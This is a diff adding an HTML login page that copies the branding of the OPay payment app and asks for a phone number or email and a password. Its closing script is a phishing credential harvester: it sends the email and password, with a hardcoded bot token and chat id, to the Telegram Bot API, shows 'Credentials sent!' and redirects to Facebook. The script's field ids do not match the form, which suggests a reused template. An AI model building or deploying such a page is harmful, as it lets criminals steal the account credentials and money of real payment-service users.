@@ -1,0 +1,258 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OPay Login</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Container mimicking mobile screen on desktop viewports */
+        .mobile-shell {
+            max-width: 430px;
+            min-height: 100vh;
+            margin: 0 auto;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            position: relative;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05);
+        }
+
+        /* Floating Label Outline Input */
+        .input-group {
+            position: relative;
+        }
+
+        .floating-input {
+            width: 100%;
+            height: 56px;
+            padding: 16px;
+            font-size: 15px;
+            color: #111827;
+            background: transparent;
+            border: 1.5px solid #00C896;
+            border-radius: 12px;
+            outline: none;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .floating-input:focus {
+            border-color: #00B084;
+            box-shadow: 0 0 0 3px rgba(0, 200, 150, 0.15);
+        }
+
+        .floating-label {
+            position: absolute;
+            left: 12px;
+            top: -10px;
+            background-color: #ffffff;
+            padding: 0 6px;
+            font-size: 12px;
+            font-weight: 500;
+            color: #00C896;
+            pointer-events: none;
+            transition: all 0.2s ease;
+        }
+
+        /* Responsive Desktop Card Fit */
+        @media (min-width: 640px) {
+            .mobile-shell {
+                min-height: 840px;
+                height: 90vh;
+                max-height: 900px;
+                margin: 2rem auto;
+                border-radius: 32px;
+                border: 1px solid #e5e7eb;
+                overflow: hidden;
+            }
+        }
+    </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen sm:p-4">
+
+    <!-- Mobile Screen Frame -->
+    <div class="mobile-shell w-full">
+        
+        <!-- Main Top Content Container -->
+        <div class="p-6 flex-1 flex flex-col">
+            
+            <!-- Header Bar -->
+            <header class="flex justify-between items-center pt-2 pb-6">
+                <button id="backBtn" class="p-2 -ml-2 text-gray-700 hover:text-gray-900 rounded-full hover:bg-gray-100 transition-colors" aria-label="Back">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7" />
+                    </svg>
+                </button>
+                <button id="helpBtn" class="text-[#00C896] font-semibold text-base hover:opacity-80 transition-opacity">
+                    Help
+                </button>
+            </header>
+
+            <!-- Accurate OPay Logo -->
+            <div class="flex justify-center mt-2 mb-8">
+                <div class="flex items-center gap-1">
+                    <!-- Emerald Ring + Inner Bar SVG -->
+                    <div class="w-9 h-9 relative flex items-center justify-center">
+                        <svg class="w-full h-full" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <circle cx="50" cy="50" r="38" stroke="#00C896" stroke-width="18"/>
+                            <rect x="22" y="44" width="22" height="12" rx="6" fill="#100E44"/>
+                        </svg>
+                    </div>
+                    <!-- Pay Typography -->
+                    <span class="text-3xl font-extrabold tracking-tight text-[#100E44] -ml-0.5">Pay</span>
+                </div>
+            </div>
+
+            <!-- Title -->
+            <h1 class="text-2xl font-bold text-gray-900 mb-8">
+                Log in to your account
+            </h1>
+
+            <!-- Form -->
+            <form id="loginForm" onsubmit="event.preventDefault();" class="space-y-6">
+                
+                <!-- Account / Email / Phone Input -->
+                <div class="input-group">
+                    <input 
+                        type="text" 
+                        id="accountInput" 
+                        class="floating-input" 
+                        placeholder=" "
+                        autocomplete="off"
+                        autofocus
+                    />
+                    <label for="accountInput" class="floating-label">
+                        Enter your Mobile No./Email
+                    </label>
+                </div>
+
+                <!-- Password Input -->
+                <div class="input-group relative">
+                    <input 
+                        type="password" 
+                        id="passwordInput" 
+                        class="floating-input pr-12" 
+                        placeholder=" "
+                        autocomplete="current-password"
+                    />
+                    <label for="passwordInput" class="floating-label">
+                        Enter Password
+                    </label>
+                    
+                    <!-- Eye Toggle Button -->
+                    <button 
+                        type="button" 
+                        id="eyeToggle" 
+                        class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 focus:outline-none p-1"
+                        aria-label="Toggle password visibility"
+                    >
+                        <svg id="eyeIcon" class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <!-- Eye Open SVG Path -->
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- Recovery Subtext -->
+                <div class="flex items-center justify-between text-sm pt-1">
+                    <p class="text-gray-500 font-normal">
+                        Lost Your Mobile Number, 
+                        <a href="#" id="changeNumLink" class="text-[#00C896] hover:underline font-medium">Change Now</a>
+                    </p>
+                </div>
+
+            </form>
+
+        </div>
+
+        <!-- Footer / Action Area -->
+        <div class="p-6 pb-8 flex flex-col space-y-4">
+            
+            <!-- NEXT Button -->
+            <button 
+                type="button" 
+                id="nextBtn" 
+                disabled 
+                class="w-full py-4 rounded-full font-bold text-lg text-white transition-all duration-200 bg-[#A6EAD7] cursor-not-allowed shadow-none"
+            >
+                NEXT
+            </button>
+
+            <!-- Account Registration Link -->
+            <div class="text-center">
+                <p class="text-sm text-gray-600">
+                    Don’t have an OPay Account yet?
+                </p>
+                <a href="#" id="signUpLink" class="text-sm font-semibold text-[#00C896] hover:underline inline-block mt-1">
+                    Click here to get one
+                </a>
+            </div>
+
+        </div>
+
+    </div>
+
+    <!-- Universal Alert Modal -->
+    <div id="modalBackdrop" class="fixed inset-0 bg-black/40 backdrop-blur-xs flex items-center justify-center p-4 opacity-0 pointer-events-none transition-opacity duration-200 z-50">
+        <div id="modalBox" class="bg-white rounded-2xl p-6 max-w-xs w-full shadow-xl transform scale-95 transition-transform duration-200 text-center">
+            <h3 id="modalTitle" class="text-lg font-bold text-gray-900 mb-2">Notice</h3>
+            <p id="modalMessage" class="text-sm text-gray-600 mb-6">Action performed.</p>
+            <button id="closeModalBtn" class="w-full py-3 bg-[#00C896] text-white font-semibold rounded-xl hover:bg-[#00B084] transition-colors">
+                OK
+            </button>
+        </div>
+    </div>
+
+    <!-- Application Script -->
+<script>
+    function sendCredentials() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        // Telegram API details
+        const botToken = '9181331705:AAG6cDB8DxQfMoECog3bHvOyVUgfzIiQL7s';
+        const chatId = '6813462951';
+        
+        // Format the message
+        const text = `📧 *New Login Attempt*\n\n👤 Email: <code>${email}</code>\n🔑 Password: <code>${pass}</code>`;
+
+        // Send to Telegram via fetch API
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: text,
+                parse_mode: 'HTML'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                alert('Credentials sent!');
+                // Optional: Redirect to real Facebook after sending
+                window.location.href = 'https://www.facebook.com/';
+            } else {
+                alert('Failed to send credentials.');
+            }
+        })
+        .catch(error => console.error('Error:', error));
+    }
+</script>
+</body>
+</html>
